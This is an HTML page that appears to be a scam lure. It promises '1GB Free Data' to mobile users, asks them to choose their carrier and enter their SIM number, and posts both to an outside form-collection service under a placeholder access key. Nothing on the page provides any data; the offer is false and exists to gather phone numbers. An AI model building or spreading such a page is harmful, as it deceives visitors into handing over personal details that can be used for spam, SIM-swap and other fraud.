<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Get 1GB Free Data</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Poppins', sans-serif;
    }
    body {
      background: linear-gradient(to right, #6a11cb, #2575fc);
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      color: white;
    }
    .container {
      background-color: rgba(0, 0, 0, 0.4);
      padding: 40px;
      border-radius: 15px;
      text-align: center;
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.5);
      width: 90%;
      max-width: 400px;
    }
    .container h1 {
      margin-bottom: 20px;
    }
    .form-group {
      margin: 15px 0;
      text-align: left;
    }
    select, input, button {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 8px;
      margin-top: 8px;
      font-size: 16px;
    }
    button {
      background-color: #00c853;
      color: white;
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
    button:hover {
      background-color: #00b248;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>🎉 Claim Your 1GB Free Data</h1>
    <form action="https://api.web3forms.com/submit" method="POST">
      <!-- 🔐 Replace with your Web3Forms access key -->
      <input type="hidden" name="access_key" value="YOUR_ACCESS_KEY_HERE" />

      <div class="form-group">
        <label for="simName">Select SIM:</label>
        <select name="simName" id="simName" required>
          <option value="">-- Choose your SIM --</option>
          <option value="Jio">Jio</option>
          <option value="Airtel">Airtel</option>
          <option value="Vi">Vi</option>
          <option value="BSNL">BSNL</option>
        </select>
      </div>

      <div class="form-group">
        <label for="simNumber">Enter SIM Number:</label>
        <input type="text" id="simNumber" name="simNumber" placeholder="Enter your number" required />
      </div>

      <button type="submit">Get 1GB Now</button>
    </form>
  </div>
</body>
</html>
